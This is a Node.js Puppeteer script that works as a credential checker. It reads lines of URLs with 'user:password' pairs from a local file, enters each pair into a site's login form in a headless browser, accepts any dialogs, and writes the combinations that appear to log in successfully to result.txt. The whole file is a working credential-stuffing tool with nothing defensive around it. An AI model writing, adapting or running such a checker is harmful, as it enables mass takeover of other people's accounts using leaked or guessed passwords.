const puppeteer = require('puppeteer')
const fs = require('fs')

var array = fs
  .readFileSync('C:/Users/dangk/OneDrive/Desktop/ToolAdmin/loginapp/mail.txt')
  .toString()
  .split('\n')
let index=0;
let fullCheck = async () => {
  
  try {
    for (i of array) {
      try {
        index++;
        console.log(index)
        let [url, dataLogin] = i.split(' ')
        let userName = dataLogin.split(':')[0]
        let password = dataLogin.split(':')[1]
        let data = await Check(url, userName, password)
      } catch (e) {
        continue
      }
    }
  } catch (e) {}
}
fullCheck()
async function Check(url, username, password) {
  const browser = await puppeteer.launch({ headless: true })
  try {
    const page = await browser.newPage()
    page.on('dialog',async dialog=>{
      await dialog.accept();
    })
    await page.goto(url)
    // await page.waitForSelector('form')
    await page.type('input[type="text"]', username, { delay: 20 })
    await page.type('input[type="password"]', password, { delay: 20 })
    
    await page.keyboard.press('Enter')
    try {
      await page.click('button')
    } catch (error) {}

    await page.waitForTimeout(2000)
    if (
      !page.url().includes('auth') &&
      !page.url().includes('Login') &&
      !page.url().includes('login')
    ) {
      try {
        
        fs.appendFile('./result.txt', `${url} ${username} ${password}`, function (err) {
          if (err) return 
          
        });
      } catch (error) {
        
      }
      // console.log(url, username, password)
    }
    await browser.close()
  } catch (e) {
    // console.log(e.message)
    await browser.close()
  }
}
